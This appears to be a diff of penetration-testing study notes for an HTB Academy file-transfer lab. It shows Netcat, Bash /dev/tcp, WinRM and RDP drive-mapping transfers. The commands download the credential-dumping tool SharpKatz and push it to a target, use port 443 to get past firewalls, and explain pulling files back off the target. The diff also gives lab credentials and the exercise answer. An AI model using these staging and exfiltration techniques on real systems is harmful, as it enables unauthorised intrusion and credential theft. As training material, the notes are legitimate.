@@ -445,56 +445,225 @@ For the optional exercise, one successful code-based download and one successful
 
 ## 5. Miscellaneous transfer methods
 
-### Netcat and Ncat
+This section covers alternatives for situations where the more familiar HTTP, HTTPS, SMB, or SCP path is unavailable.
 
-Receiver listens, sender connects:
+| Method | Typical use | Requirement |
+|---|---|---|
+| Netcat/Ncat | Simple byte-stream transfer in either direction | Reachable TCP port and `nc`/`ncat` on both systems |
+| Bash `/dev/tcp` | Receive a stream when Netcat is absent | Bash compiled with `/dev/tcp` support |
+| PowerShell Remoting | Windows-to-Windows transfer | WinRM, authorization, and appropriate privileges |
+| RDP drive redirection | Interactive two-way transfer during an RDP session | RDP plus `xfreerdp`, `rdesktop`, or `mstsc.exe` |
+
+### Netcat and Ncat fundamentals
+
+Netcat reads from standard input and writes received network data to standard output. Shell redirection supplies or captures the file:
+
+- `< file` reads a local file and feeds its bytes into Netcat.
+- `> file` captures received bytes and writes them to a local file.
+- `-l` selects listen mode.
+- `-p PORT` selects the local listening port.
+- Original Netcat's `-q 0` closes immediately after standard input reaches end-of-file.
+- Ncat's `--send-only` closes after sending all input.
+- Ncat's `--recv-only` receives data without waiting to send anything back.
+
+The listener can run on either side. Start the listener first, then run the connecting command.
+
+#### Method 1: target listens and Pwnbox sends
+
+This copies `SharpKatz.exe` from the Pwnbox to the target.
+
+Target using original Netcat:
 
 ```bash
-# receiver
-nc -lvnp 9001 > received.bin
-
-# sender
-nc RECEIVER_IP 9001 < file.bin
+nc -l -p 8000 > SharpKatz.exe
 ```
 
-Ncat can make completion explicit:
+Pwnbox using original Netcat:
 
 ```bash
-ncat -l 9001 --recv-only > received.bin
-ncat RECEIVER_IP 9001 --send-only < file.bin
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+nc -q 0 TARGET_IP 8000 < SharpKatz.exe
 ```
 
-If Netcat is missing but Bash supports `/dev/tcp`:
+Target using Ncat:
 
 ```bash
-cat file.bin > /dev/tcp/RECEIVER_IP/9001
+ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
 
-Plain Netcat has no encryption, authentication, integrity protection, or filename metadata. Restrict listeners to the lab and verify hashes.
+Pwnbox using Ncat:
 
-### PowerShell Remoting
+```bash
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+ncat --send-only TARGET_IP 8000 < SharpKatz.exe
+```
 
-If WinRM is enabled and authorized, use PowerShell sessions for authenticated transfer:
+#### Method 2: Pwnbox listens and target connects
+
+This arrangement is useful when a firewall blocks inbound connections to the target but permits the target to make an outbound connection.
+
+Pwnbox using original Netcat:
+
+```bash
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+
+Target using original Netcat:
+
+```bash
+nc PWNBOX_IP 443 > SharpKatz.exe
+```
+
+Pwnbox using Ncat:
+
+```bash
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+Target using Ncat:
+
+```bash
+ncat PWNBOX_IP 443 --recv-only > SharpKatz.exe
+```
+
+Using TCP/443 does not make Netcat traffic HTTPS or encrypted. It is still a plaintext byte stream.
+
+#### Bash `/dev/tcp` fallback
+
+If the Linux target lacks Netcat and Ncat, Bash can open a TCP connection through its `/dev/tcp/HOST/PORT` pseudo-path.
+
+First make the Pwnbox listen and send the file:
+
+```bash
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+
+Or use Ncat:
+
+```bash
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+Then receive it on the target:
+
+```bash
+cat < /dev/tcp/PWNBOX_IP/443 > SharpKatz.exe
+```
+
+The same patterns can be reversed to copy a file from the target to the Pwnbox: the system holding the source file uses `< SOURCE_FILE`, and the receiver uses `> DESTINATION_FILE`.
+
+Plain Netcat provides no encryption, authentication, integrity protection, or filename metadata. Use it only in the authorized lab, close the listener after transfer, and compare file hashes.
+
+### PowerShell Session file transfer
+
+PowerShell Remoting, also called WinRM, can transfer files between Windows systems when HTTP, HTTPS, or SMB is unavailable. WinRM commonly listens on TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+The account must have administrative rights, belong to **Remote Management Users**, or have explicit permission in the PowerShell session configuration.
+
+Confirm that the WinRM HTTP port is reachable:
 
 ```powershell
-$s = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
-Copy-Item .\\tool.ps1 -Destination 'C:\\Temp\\tool.ps1' -ToSession $s
-Copy-Item 'C:\\Temp\\result.txt' -Destination .\\result.txt -FromSession $s
-Remove-PSSession $s
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
 ```
 
-WinRM commonly uses TCP 5985 for HTTP and 5986 for HTTPS.
+Create a session and save it in `$Session`:
 
-### RDP clipboard and drive redirection
+```powershell
+$Session = New-PSSession -ComputerName DATABASE01
+```
 
-RDP clients can map a local directory into the Windows session:
+Copy from the local Windows system to the remote session:
+
+```powershell
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+Copy from the remote session to the local Windows system:
+
+```powershell
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+Direction is controlled by the session parameter:
+
+| Parameter | Direction |
+|---|---|
+| `-ToSession $Session` | Local Windows host → remote Windows host |
+| `-FromSession $Session` | Remote Windows host → local Windows host |
+
+### RDP file transfer
+
+RDP supports ordinary copy and paste, but clipboard redirection may be disabled or unreliable. A more explicit method is to expose a Pwnbox directory as a drive inside the remote Windows session.
+
+Mount a Linux folder with `rdesktop`:
 
 ```bash
-xfreerdp /v:TARGET_IP /u:USER /p:'PASSWORD' /drive:share,/srv/share
-rdesktop TARGET_IP -r disk:share=/srv/share
+rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' -r disk:linux='/home/user/rdesktop/files'
 ```
 
-The mapped directory usually appears under `\\tsclient\\share`. Clipboard and drive redirection may be disabled by policy and are logged.
+Mount a Linux folder with `xfreerdp`:
+
+```bash
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:linux,/home/user/filetransfer
+```
+
+| Option | Meaning |
+|---|---|
+| `/v:TARGET_IP` | Remote Windows host |
+| `/d:DOMAIN` or `-d DOMAIN` | Windows domain; omit it when the lab gives no domain |
+| `/u:USER` or `-u USER` | RDP username |
+| `/p:'PASSWORD'` or `-p 'PASSWORD'` | RDP password |
+| `/drive:linux,PATH` | Share `PATH` under the name `linux` with `xfreerdp` |
+| `-r disk:linux=PATH` | Share `PATH` under the name `linux` with `rdesktop` |
+
+Inside Windows, open File Explorer and enter:
+
+```text
+\\tsclient\linux
+```
+
+Files copied into this location appear in the mapped Pwnbox directory. Files already in the Pwnbox directory can be copied from this location into Windows. The redirected drive is scoped to the RDP session and may be blocked by system policy. Windows Defender can also inspect files exposed through the shared directory.
+
+### Hands-on workflow: optional RDP exercise
+
+The Section 5 exercise asks the learner to connect to the Windows target with `htb-student`, mount a Linux directory, and verify transfers in both directions.
+
+Prepare a harmless file on the Pwnbox:
+
+```bash
+mkdir -p "$HOME/filetransfer"
+echo "File created on the Pwnbox" > "$HOME/filetransfer/pwnbox-test.txt"
+ls -l "$HOME/filetransfer"
+```
+
+After spawning the lab target, connect with the credentials supplied by HTB:
+
+```bash
+xfreerdp /v:TARGET_IP /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,$HOME/filetransfer
+```
+
+The `rdesktop` alternative is:
+
+```bash
+rdesktop TARGET_IP -u htb-student -p 'HTB_@cademy_stdnt!' -r disk:linux="$HOME/filetransfer"
+```
+
+Inside the Windows session:
+
+1. Open File Explorer and browse to `\\tsclient\linux`.
+2. Confirm that `pwnbox-test.txt` is visible.
+3. Copy `pwnbox-test.txt` to the Windows Desktop to test Pwnbox → target.
+4. Create a harmless text file on the Windows Desktop.
+5. Copy that Windows file into `\\tsclient\linux` to test target → Pwnbox.
+
+Back on the Pwnbox, verify that the Windows file arrived:
+
+```bash
+ls -l "$HOME/filetransfer"
+cat "$HOME/filetransfer/WINDOWS_FILE_NAME"
+```
+
+After both directions work, the exercise answer is `DONE`.
 
 ---
 
